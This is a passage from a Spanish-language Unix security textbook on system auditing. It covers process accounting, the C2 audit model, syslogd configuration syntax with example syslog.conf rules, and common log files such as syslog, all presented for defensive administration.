continuaci&#x00F3;n son comunes en cualquier sistema, su localizaci&#x00F3;n, o incluso su formato, pueden variar entre
diferentes Unices.
<!--br/-->
<!--br/-->Dentro de Unix hay dos grandes familias de sistemas: se trata de System V y BSD; la localizaci&#x00F3;n de &#xFB01;cheros
y ciertas &#x00F3;rdenes relativas a la auditor&#x02CA;&#x0131;a de la m&#x00E1;quina van a ser diferentes en ellas, por lo que es muy
recomendable consultar las p&#x00E1;ginas del manual antes de ponerse a con&#xFB01;gurar el sistema de auditor&#x02CA;&#x0131;a en un
equipo concreto. La principal diferencia entre ellos es el denominado process accounting o
simplemente accounting, consistente en registrar todos los programas ejecutados por cada
usuario; evidentemente, los informes generados en este proceso pueden llegar a ocupar much&#x02CA;&#x0131;simo
espacio en disco (dependiendo del n&#x00FA;mero de usuarios en nuestro sistema) por lo que s&#x00F3;lo es
recomendable en situaciones muy concretas, por ejemplo para detectar actividades sospechosas en una
m&#x00E1;quina o para cobrar por el tiempo de CPU consumido. En los sistemas System V el process
accounting est&#x00E1; desactivado por defecto; se puede iniciar mediante /usr/lib/acct/startup, y
para visualizar los informes se utiliza la orden acctcom. En la familia BSD los equivalentes a
estas &#x00F3;rdenes son accton y lastcomm; en este caso el process accounting est&#x00E1; inicializado por
defecto.
<!--br/-->
<!--br/-->Un mundo aparte a la hora de generar (y analizar) informes acerca de las actividades realizadas sobre una
m&#x00E1;quina Unix son los sistemas con el modelo de auditor&#x02CA;&#x0131;a C2 (<citation>[?]</citation>); mientras que con el modelo cl&#x00E1;sico se
genera un registro tras la ejecuci&#x00F3;n de cada proceso, en Unix C2 se proporciona una pista de
auditor&#x02CA;&#x0131;a donde se registran los accesos y los intentos de acceso de una entidad a un objeto,
as&#x02CA;&#x0131; como cada cambio en el estado del objeto, la entidad o el sistema global. Esto se consigue

asignando un identi&#xFB01;cador denominado Audit ID a cada grupo de procesos ejecutados (desde el
propio login), identi&#xFB01;cador que se registra junto a la mayor&#x02CA;&#x0131;a de llamadas al sistema que un
proceso realiza, incluyendo algunas tan comunes como write(), open(), close() o read().
A nadie se le puede escapar la cantidad de espacio y de CPU necesarios para mantener los
registros a un nivel tan preciso, por lo que en la mayor&#x02CA;&#x0131;a de sistemas (especialmente en entornos
habituales, como los estudiados aqu&#x02CA;&#x0131;) el modelo de auditor&#x02CA;&#x0131;a C2 es innecesario; y no s&#x00F3;lo esto,
sino que en muchas ocasiones tambi&#x00E9;n se convierte en una monitorizaci&#x00F3;n in&#x00FA;til (<citation>[?]</citation>) si no se
dispone de mecanismos para interpretar o reducir la gran cantidad de datos registrados: el
administrador guarda tanta informaci&#x00F3;n que es casi imposible analizarla en busca de actividades
sospechosas.
  </para></section><!--end section--><!--l. 81--><section 
role="section"><title><abbrev role="title-mark">6.3</abbrev><anchor 
   id="x1-860006.3"  ></anchor>El demonio syslogd</title>
<!--l. 82--><para>  El demonio syslogd (Syslog Daemon) se lanza autom&#x00E1;ticamente al arrancar un sistema Unix, y es el
encargado de guardar informes sobre el funcionamiento de la m&#x00E1;quina. Recibe mensajes de las diferentes
partes del sistema (n&#x00FA;cleo, programas&#x2026;) y los env&#x02CA;&#x0131;a y/o almacena en diferentes localizaciones, tanto locales
como remotas, siguiendo un criterio de&#xFB01;nido en el &#xFB01;chero de con&#xFB01;guraci&#x00F3;n /etc/syslog.conf, donde
especi&#xFB01;camos las reglas a seguir para gestionar el almacenamiento de mensajes del sistema. Las
l&#x02CA;&#x0131;neas de este archivo que comienzan por &#x2018;#&#x2019; son comentarios, con lo cual son ignoradas de la
misma forma que las l&#x02CA;&#x0131;neas en blanco; si ocurriera un error al interpretar una de las l&#x02CA;&#x0131;neas
del &#xFB01;chero, se ignorar&#x02CA;&#x0131;a la l&#x02CA;&#x0131;nea completa. Un ejemplo de &#xFB01;chero /etc/syslog.conf es el
siguiente:

     </para><literallayout role="verbatim">
&#x00A0;anita:~#&#x00A0;cat&#x00A0;/etc/syslog.conf
&#x00A0;#ident &#x0022;@(#)syslog.conf 1.4 96/10/11&#x00A0;SMI&#x0022; /*&#x00A0;SunOS&#x00A0;5.0&#x00A0;*/
&#x00A0;#
&#x00A0;#&#x00A0;Copyright&#x00A0;(c)&#x00A0;1991-1993,&#x00A0;by&#x00A0;Sun&#x00A0;Microsystems,&#x00A0;Inc.
&#x00A0;#
&#x00A0;#&#x00A0;syslog&#x00A0;configuration&#x00A0;file.
&#x00A0;#
&#x00A0;#&#x00A0;This&#x00A0;file&#x00A0;is&#x00A0;processed&#x00A0;by&#x00A0;m4&#x00A0;so&#x00A0;be&#x00A0;careful&#x00A0;to&#x00A0;quote&#x00A0;(&#x2018;&#x2019;)&#x00A0;names
&#x00A0;#&#x00A0;that&#x00A0;match&#x00A0;m4&#x00A0;reserved&#x00A0;words.&#x00A0;&#x00A0;Also,&#x00A0;within&#x00A0;ifdef&#x2019;s,&#x00A0;arguments
&#x00A0;#&#x00A0;containing&#x00A0;commas&#x00A0;must&#x00A0;be&#x00A0;quoted.
&#x00A0;#
&#x00A0;*.err;kern.notice;auth.notice /dev/console
&#x00A0;*.err;kern.debug;daemon.notice;mail.crit /var/adm/messages
&#x00A0;
&#x00A0;*.alert;kern.err;daemon.err operator
&#x00A0;*.alert root
&#x00A0;
&#x00A0;*.emerg *
&#x00A0;
&#x00A0;#&#x00A0;if&#x00A0;a&#x00A0;non-loghost&#x00A0;machine&#x00A0;chooses&#x00A0;to&#x00A0;have&#x00A0;authentication&#x00A0;messages
&#x00A0;#&#x00A0;sent&#x00A0;to&#x00A0;the&#x00A0;loghost&#x00A0;machine,&#x00A0;un-comment&#x00A0;out&#x00A0;the&#x00A0;following&#x00A0;line:
&#x00A0;#auth.notice ifdef(&#x2018;LOGHOST&#x2019;,&#x00A0;/var/log/authlog,&#x00A0;@loghost)
&#x00A0;
&#x00A0;mail.debug ifdef(&#x2018;LOGHOST&#x2019;,&#x00A0;/var/log/syslog,&#x00A0;@loghost)
&#x00A0;
&#x00A0;#
&#x00A0;#&#x00A0;non-loghost&#x00A0;machines&#x00A0;will&#x00A0;use&#x00A0;the&#x00A0;following&#x00A0;lines&#x00A0;to&#x00A0;cause&#x00A0;&#x0022;user&#x0022;
&#x00A0;#&#x00A0;log&#x00A0;messages&#x00A0;to&#x00A0;be&#x00A0;logged&#x00A0;locally.
&#x00A0;#
&#x00A0;ifdef(&#x2018;LOGHOST&#x2019;,&#x00A0;,
&#x00A0;user.err /dev/console
&#x00A0;user.err /var/adm/messages
&#x00A0;user.alert &#x2018;root,&#x00A0;operator&#x2019;
&#x00A0;user.emerg *
&#x00A0;)
&#x00A0;anita:~#
</literallayout>
<!--l. 134--><para>Podemos ver que cada regla del archivo tiene dos campos: un campo de selecci&#x00F3;n y un campo de acci&#x00F3;n,
separados ambos por espacios o tabuladores. El campo de selecci&#x00F3;n est&#x00E1; compuesto a su vez de dos partes
separadas por un punto: una que indica el servicio que env&#x02CA;&#x0131;a el mensaje y otra que marca su prioridad,
separadas por un punto (&#x2018;.&#x2019;); ambas son indiferentes a may&#x00FA;sculas y min&#x00FA;sculas. La parte del servicio
contiene una de las siguientes palabras clave: auth, auth-priv, cron, daemon, kern, lpr, mail, mark,
news, security (equivalente a auth), syslog, user, uucp y local0 hasta local7; esta parte especi&#xFB01;ca el
&#x2018;subsistema&#x2019; que ha generado ese mensaje (por ejemplo, todos los programas relacionados con el correo
generar&#x00E1;n mensajes ligados al servicio mail). En segundo lugar, la prioridad est&#x00E1; compuesta
de uno de los siguientes t&#x00E9;rminos, en orden ascendente: debug, info, notice, warning, warn
(equivalente a warning), err, error (equivalente a err), crit, alert, emerg, y panic (equivalente a
emerg). La prioridad de&#xFB01;ne la gravedad o importancia del mensaje almacenado. Todos los
mensajes de la prioridad especi&#xFB01;cada y superiores son almacenados de acuerdo con la acci&#x00F3;n
requerida.
<!--br/-->
<!--br/-->Adem&#x00E1;s de los t&#x00E9;rminos mencionados hasta ahora, el demonio syslogd emplea en su &#xFB01;chero de con&#xFB01;guraci&#x00F3;n
los siguientes caracteres especiales:

     </para><itemizedlist>
     <listitem>
     <!--l. 157--><para> &#x2018;<informalequation><graphic 
fileref="unixsec54x.gif"></graphic></informalequation>&#x2019; (asterisco)
     <!--br/-->Empleado como comod&#x02CA;&#x0131;n para todas las prioridades y servicios anteriores, dependiendo de d&#x00F3;nde son
     usados (si antes o despu&#x00E9;s del car&#x00E1;cter de separaci&#x00F3;n &#x2018;.&#x2019;):

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Guardar&#x00A0;todos&#x00A0;los&#x00A0;mensajes&#x00A0;del&#x00A0;servicio&#x00A0;mail&#x00A0;en&#x00A0;/var/adm/mail
&#x00A0;#
&#x00A0;mail.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/mail
</literallayout>
     </listitem>
     <listitem>
     <!--l. 168--><para> &#x2018; &#x2019; (blanco, espacio, nulo)
     <!--br/-->Indica que no hay prioridad de&#xFB01;nida para el servicio de la l&#x02CA;&#x0131;nea almacenada.
     </para></listitem>
     <listitem>
     <!--l. 171--><para> &#x2018;,&#x2019; (coma)
     <!--br/-->Con este car&#x00E1;cter es posible especi&#xFB01;car m&#x00FA;ltiples servicios con el mismo patr&#x00F3;n de prioridad en una
     misma l&#x02CA;&#x0131;nea. Es posible enumerar cuantos servicios se quieran:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Guardar&#x00A0;todos&#x00A0;los&#x00A0;mensajes&#x00A0;mail.info&#x00A0;y&#x00A0;news.info&#x00A0;en
&#x00A0;#&#x00A0;/var/adm/info
&#x00A0;mail,news.=info&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/info
</literallayout>
     </listitem>
     <listitem>
     <!--l. 182--><para> &#x2018;;&#x2019; (punto y coma)
     <!--br/-->Es posible dirigir los mensajes de varios servicios y prioridades a un mismo destino, separ&#x00E1;ndolos por
     este car&#x00E1;cter:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Guardamos&#x00A0;los&#x00A0;mensajes&#x00A0;de&#x00A0;prioridad&#x00A0;&#x0022;info&#x0022;&#x00A0;y&#x00A0;&#x0022;notice&#x0022;
&#x00A0;#&#x00A0;en&#x00A0;el&#x00A0;archivo&#x00A0;/var/log/messages
&#x00A0;*.=info;*.=notice&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/log/messages
</literallayout>
     </listitem>
     <listitem>
     <!--l. 193--><para> &#x2018;=&#x2019; (igual)
     <!--br/-->De este modo solo se almacenan los mensajes con la prioridad exacta especi&#xFB01;cada y no incluyendo
     las superiores:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Guardar&#x00A0;todos&#x00A0;los&#x00A0;mensajes&#x00A0;criticos&#x00A0;en&#x00A0;/var/adm/critical
&#x00A0;#
&#x00A0;*.=crit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/critical
</literallayout>
     </listitem>
     <listitem>
     <!--l. 204--><para> &#x2018;!&#x2019; (exclamaci&#x00F3;n)
     <!--br/-->Preceder el campo de prioridad con un signo de exclamaci&#x00F3;n sirve para ignorar todas las prioridades,
     teniendo la posibilidad de escoger entre la especi&#xFB01;cada (!=prioridad) y la especi&#xFB01;cada m&#x00E1;s todas las
     superiores (!prioridad). Cuando se usan conjuntamente los caracteres &#x2018;=&#x2019; y &#x2018;!&#x2019;, el signo
     de exclamaci&#x00F3;n &#x2018;!&#x2019; debe preceder obligatoriamente al signo igual &#x2018;=&#x2019;, de esta forma:
     !=.

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Guardar&#x00A0;mensajes&#x00A0;del&#x00A0;kernel&#x00A0;de&#x00A0;prioridad&#x00A0;info,&#x00A0;pero&#x00A0;no&#x00A0;de
&#x00A0;#&#x00A0;prioridad&#x00A0;err&#x00A0;y&#x00A0;superiores
&#x00A0;#&#x00A0;Guardar&#x00A0;mensajes&#x00A0;de&#x00A0;mail&#x00A0;excepto&#x00A0;los&#x00A0;de&#x00A0;prioridad&#x00A0;info
&#x00A0;kern.info;kern.!err&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/kernel-info
&#x00A0;mail.*;mail.!=info&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/mail
</literallayout>
     </listitem></itemizedlist>
<!--l. 221--><para>La segunda parte de cada l&#x02CA;&#x0131;nea del archivo de con&#xFB01;guraci&#x00F3;n de syslogd es el campo de acci&#x00F3;n, y describe el
destino de los mensajes (d&#x00F3;nde se van a guardar o qu&#x00E9; programa los va a procesar); este destino puede ser
uno de los siguientes:
     </para><itemizedlist>
     <listitem>
     <!--l. 226--><para>Un &#xFB01;chero plano
     <!--br/-->Normalmente los mensajes del sistema son almacenados en &#xFB01;cheros planos. Dichos &#xFB01;cheros han de
     estar especi&#xFB01;cados con la ruta de acceso completa (comenzando con &#x2018;/&#x2019;).
     <!--br/-->Podemos preceder cada entrada con el signo menos, &#x2018;-&#x2019;, para omitir la sincronizaci&#x00F3;n del archivo
     (vaciado del bu&#xFB00;er de memoria a disco). Aunque puede ocurrir que se pierda informaci&#x00F3;n si el sistema
     cae justo despu&#x00E9;s de un intento de escritura en el archivo, utilizando este signo se puede conseguir una
     mejora importante en la velocidad, especialmente si estamos ejecutando programas que mandan
     muchos mensajes al demonio syslogd.

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Guardamos&#x00A0;todos&#x00A0;los&#x00A0;mensajes&#x00A0;de&#x00A0;prioridad&#x00A0;critica&#x00A0;en&#x00A0;&#x0022;critical&#x0022;
&#x00A0;#
&#x00A0;*.=crit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/var/adm/critical
</literallayout>
     </listitem>
     <listitem>
     <!--l. 244--><para>Un dispositivo f&#x02CA;&#x0131;sico
     <!--br/-->Tambi&#x00E9;n tenemos la posibilidad de enviar los registros del sistema a un dispositivo f&#x02CA;&#x0131;sico del mismo,
     t&#x02CA;&#x0131;picamente un terminal o una impresora. As&#x02CA;&#x0131; conseguimos, entre otras cosas, que esas
     entradas permanezcan relativa o totalmente inalteradas (en funci&#x00F3;n de qu&#x00E9; dispositivo
     las reciban). Por ejemplo, podemos tener uno de los terminales virtuales que muchos
     sistemas Unix ofrecen en su consola &#x2018;dedicado&#x2019; a listar los mensajes del sistema, que
     podr&#x00E1;n ser consultados con solo cambiar a ese terminal mediante la combinaci&#x00F3;n de teclas
     correspondiente:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Enviamos&#x00A0;todos&#x00A0;los&#x00A0;mensajes&#x00A0;a&#x00A0;tty12&#x00A0;(ALT+F12&#x00A0;en&#x00A0;Linux)&#x00A0;y&#x00A0;todos
&#x00A0;#&#x00A0;los&#x00A0;mensajes&#x00A0;criticos&#x00A0;del&#x00A0;nucleo&#x00A0;a&#x00A0;consola
&#x00A0;#
&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/dev/tty12
&#x00A0;kern.crit&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/dev/console
</literallayout>
     </listitem>
     <listitem>
     <!--l. 262--><para>Una tuber&#x02CA;&#x0131;a con nombre
     <!--br/-->Algunas versiones de syslogd permiten enviar registros a &#xFB01;cheros de tipo pipe simplemente
     anteponiendo el s&#x02CA;&#x0131;mbolo &#x2018;<informalequation><graphic 
fileref="unixsec55x.gif"></graphic></informalequation>&#x2019; al nombre del archivo; dicho &#xFB01;chero ha de ser creado antes de iniciar el
     demonio syslogd, mediante &#x00F3;rdenes como mkfifo o mknod. Esto es &#x00FA;til para debug y tambi&#x00E9;n para
     procesar los registros utilizando cualquier aplicaci&#x00F3;n de Unix, tal y como veremos al hablar de logs
     remotos cifrados.
     <!--br/-->Por ejemplo, la siguiente l&#x02CA;&#x0131;nea de /etc/syslog.conf enviar&#x02CA;&#x0131;a todos los mensajes de cualquier
     prioridad a uno de estos &#xFB01;cheros denominado /var/log/mififo:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Enviamos&#x00A0;todos&#x00A0;los&#x00A0;mensajes&#x00A0;a&#x00A0;la&#x00A0;tuberia&#x00A0;con&#x00A0;nombre
&#x00A0;#&#x00A0;/var/log/mififo
&#x00A0;#
&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;|/var/log/mififo
</literallayout>
     </listitem>
     <listitem>
     <!--l. 281--><para>Una m&#x00E1;quina remota
     <!--br/-->Se pueden enviar los mensajes del sistema a otra m&#x00E1;quina, de manera a que sean almacenados
     remotamente, sin m&#x00E1;s que indicar en el campo de acci&#x00F3;n el nombre o direcci&#x00F3;n de dicho sistema
     precedido por el signo &#x2018;@&#x2019;. Esto es &#x00FA;til si tenemos una m&#x00E1;quina segura, en la que podemos con&#xFB01;ar,
     conectada a la red, ya que de esta manera se guardar&#x02CA;&#x0131;a all&#x02CA;&#x0131; una copia de los mensajes de nuestro
     sistema, copia que no podr&#x02CA;&#x0131;a ser modi&#xFB01;cada en caso de que alguien entrase en la m&#x00E1;quina que los est&#x00E1;
     generando. Esto es especialmente interesante para detectar usuarios &#x2018;ocultos&#x2019; en nuestro sistema
     (usuarios maliciosos que han conseguido los su&#xFB01;cientes privilegios para ocultar sus procesos o su
     conexi&#x00F3;n), ya que una de las principales cosas que har&#x00E1; este tipo de atacantes es eliminar
     cualquier registro que denote su presencia en la m&#x00E1;quina (por ejemplo, sus entradas en
     wtmp).
     <!--br/-->En el siguiente ejemplo utilizamos un sistema a priori con&#xFB01;able para enviarle algunos de nuestros
     registros:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Enviamos&#x00A0;los&#x00A0;mensajes&#x00A0;de&#x00A0;prioridad&#x00A0;warning&#x00A0;y&#x00A0;superiores&#x00A0;al
&#x00A0;#&#x00A0;fichero&#x00A0;&#x0022;syslog&#x0022;&#x00A0;y&#x00A0;todos&#x00A0;los&#x00A0;mensajes&#x00A0;(incluidos&#x00A0;los
&#x00A0;#&#x00A0;anteriores)&#x00A0;a&#x00A0;la&#x00A0;maquina&#x00A0;&#x0022;secure.upv.es&#x0022;
&#x00A0;#
&#x00A0;*.warn&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;/usr/adm/syslog
&#x00A0;*.*&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;@secure.upv.es
</literallayout>
     </listitem>
     <listitem>
     <!--l. 306--><para>Unos usuarios del sistema (si est&#x00E1;n conectados)
     <!--br/-->Se especi&#xFB01;ca la lista de usuarios que deben recibir un tipo de mensajes simplemente escribiendo sus
     login, separados por comas:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Enviamos&#x00A0;los&#x00A0;mensajes&#x00A0;con&#x00A0;la&#x00A0;prioridad&#x00A0;&#x0022;alert&#x0022;&#x00A0;a&#x00A0;root&#x00A0;y&#x00A0;toni
&#x00A0;#
&#x00A0;*.alert&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;root,&#x00A0;toni
</literallayout>
     </listitem>
     <listitem>
     <!--l. 316--><para>Todos los usuarios que est&#x00E9;n conectados
     <!--br/-->Los errores con una prioridad de emergencia se suelen enviar a todos los usuarios que est&#x00E9;n
     conectados al sistema, de manera que se den cuenta de que algo va mal; para ello utilizamos un
     asterisco en el campo de acci&#x00F3;n:

         </para><literallayout role="verbatim">
&#x00A0;#&#x00A0;Mostramos&#x00A0;los&#x00A0;mensajes&#x00A0;urgentes&#x00A0;a&#x00A0;todos&#x00A0;los&#x00A0;usuarios
&#x00A0;#&#x00A0;conectados,&#x00A0;mediante&#x00A0;wall
&#x00A0;*.=emerg&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;&#x00A0;*
</literallayout>
     </listitem></itemizedlist>
<!--l. 328--><para>Cuando un programa quiere enviar un mensaje al demonio syslogd utiliza la llamada syslog(3); al hacerlo,
se ha de indicar tanto el servicio como la prioridad del mismo. Evidentemente, esto es v&#x00E1;lido
para el c&#x00F3;digo en C: si queremos enviar registros al demonio para que sean procesados desde
un shellscript podemos utilizar la orden logger, en la que tambi&#x00E9;n podemos indicar ambos
par&#x00E1;metros:

     </para><literallayout role="verbatim">
&#x00A0;luisa:~#&#x00A0;logger&#x00A0;-p&#x00A0;local0.info&#x00A0;&#x0022;Esto&#x00A0;es&#x00A0;una&#x00A0;prueba&#x0022;
&#x00A0;luisa:~#&#x00A0;tail&#x00A0;-1&#x00A0;/var/adm/messages
&#x00A0;May&#x00A0;14&#x00A0;03:53:14&#x00A0;luisa&#x00A0;root:&#x00A0;Esto&#x00A0;es&#x00A0;una&#x00A0;prueba
&#x00A0;luisa:~#
</literallayout>
<!--l. 342--><para>
  </para></section><!--end section--><!--l. 342--><section 
role="section"><title><abbrev role="title-mark">6.4</abbrev><anchor 
   id="x1-870006.4"  ></anchor>Algunos archivos de log</title>
<!--l. 343--><para>  En funci&#x00F3;n de la con&#xFB01;guraci&#x00F3;n del sistema de auditor&#x02CA;&#x0131;a de cada equipo Unix los eventos que sucedan en la
m&#x00E1;quina se registrar&#x00E1;n en determinados &#xFB01;cheros; aunque podemos loggear en cualquier &#xFB01;chero (incluso
a trav&#x00E9;s de la red o en dispositivos, como ya hemos comentado y luego veremos con mayor
detalle), existen ciertos archivos de registro &#x2018;habituales&#x2019; en los que se almacena informaci&#x00F3;n.
A continuaci&#x00F3;n vamos a comentar los m&#x00E1;s comunes y la informaci&#x00F3;n que registra cada uno de
ellos.
  </para><!--l. 351--><section 
role="subsection"><title><abbrev role="title-mark">6.4.1</abbrev><anchor 
   id="x1-880006.4.1"  ></anchor>syslog</title>
<!--l. 352--><para>  El archivo syslog (guardado en /var/adm/ o /var/log/) es quiz&#x00E1;s el &#xFB01;chero de log m&#x00E1;s importante del
sistema; en &#x00E9;l se guardan, en texto claro, mensajes relativos a la seguridad de la m&#x00E1;quina, como los accesos o
los intentos de acceso a ciertos servicios. No obstante, este &#xFB01;chero es escrito por syslogd, por lo
que dependiendo de nuestro &#xFB01;chero de con&#xFB01;guraci&#x00F3;n encontraremos en el archivo una u otra
informaci&#x00F3;n. Al estar guardado en formato texto, podemos visualizar su contenido con un simple
cat:

     </para><literallayout role="verbatim">
&#x00A0;anita:/#&#x00A0;cat&#x00A0;/var/log/syslog
&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;04:15:23&#x00A0;anita&#x00A0;in.telnetd[11632]:&#x00A0;connect&#x00A0;from&#x00A0;localhost
&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;06:16:52&#x00A0;anita&#x00A0;rpcbind:&#x00A0;connect&#x00A0;from&#x00A0;127.0.0.1&#x00A0;to&#x00A0;getport(R&#x00A0;)
&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;06:16:53&#x00A0;anita&#x00A0;last&#x00A0;message&#x00A0;repeated&#x00A0;3&#x00A0;times
&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;06:35:08&#x00A0;anita&#x00A0;rpcbind:&#x00A0;connect&#x00A0;from&#x00A0;127.0.0.1&#x00A0;to&#x00A0;getport(R&#x00A0;)
&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;18:26:56&#x00A0;anita&#x00A0;rpcbind:&#x00A0;connect&#x00A0;from&#x00A0;127.0.0.1&#x00A0;to&#x00A0;getport(R&#x00A0;)
&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;18:28:47&#x00A0;anita&#x00A0;last&#x00A0;message&#x00A0;repeated&#x00A0;1&#x00A0;time
&#x00A0;Mar&#x00A0;&#x00A0;5&#x00A0;18:32:43&#x00A0;anita&#x00A0;rpcbind:&#x00A0;connect&#x00A0;from&#x00A0;127.0.0.1&#x00A0;to&#x00A0;getport(R&#x00A0;)
&#x00A0;Mar&#x00A0;&#x00A0;6&#x00A0;02:30:26&#x00A0;anita&#x00A0;rpcbind:&#x00A0;connect&#x00A0;from&#x00A0;127.0.0.1&#x00A0;to&#x00A0;getport(R&#x00A0;)
